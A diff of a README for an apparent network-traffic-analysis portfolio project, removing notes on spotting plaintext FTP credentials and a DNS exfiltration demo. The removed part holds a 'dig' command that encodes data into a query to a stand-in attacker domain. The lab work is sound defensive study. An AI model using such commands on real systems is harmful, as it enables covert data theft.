@@ -10,38 +10,9 @@ The goal is to showcase practical network analysis skills relevant to cybersecur
 ## 🛠️ Tools Used
 - Kali Linux (2024.1)
 - Wireshark
-- tcpdump
 - FTP server (vsftpd or Metasploitable)
 - Dig / Iodine for DNS testing
 
 ---
 
-## 🧪 Traffic Analysis
-
-### 1️⃣ FTP Login in Plaintext
-
-- **Capture File:** `ftp_login.pcap`
-- **Scenario:** A user logs into an FTP server using unencrypted credentials.
-- **Findings:** The credentials were clearly visible in the packet capture.
-  
-#### 🔎 Key Observations:
-- FTP transmits credentials in plaintext.
-- Wireshark filter used: `ftp.request`
-- Captured `USER` and `PASS` commands with values.
-
-📷 **Screenshot:**  
-![FTP Login](screenshots/ftp_login.png)
-
----
-
-### 2️⃣ DNS Exfiltration Attempt
-
-- **Capture File:** `rpl-dio-mc-nsa-optional-tlv-dissector-sample.pcap`
-- **Scenario:** A client encodes sensitive data into DNS queries.
-- **Findings:** Suspiciously long or randomized domain names that indicate potential exfiltration.
-
-#### 🔎 Key Observations:
-- Used `dig` to simulate exfiltration:
-  ```bash
-  dig verysecretdata.attacker-domain.com
 
